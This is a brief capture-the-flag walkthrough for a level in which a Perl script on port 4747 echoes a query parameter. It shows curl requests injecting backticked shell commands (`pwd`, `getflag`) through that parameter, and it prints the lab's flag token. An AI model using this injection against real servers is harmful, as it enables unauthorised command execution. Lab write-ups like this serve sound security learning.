## Level 04

in this level, we have a pl script that contains a var that will be echo
it's accessible on port 4747 if we do a request by changing the value of x variable, we can print different things with a ```GET``` method  
```curl -X GET http://localhost:4747?x='`pwd`'```
/var/www/level04 -> a different path for the level04
so we can understand that you can access content from level04 in the server
```cd /var/www/level04``` ```getflag```
and nope, it don't works.
```curl -X GET http://localhost:4747?x='`getflag`'```
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
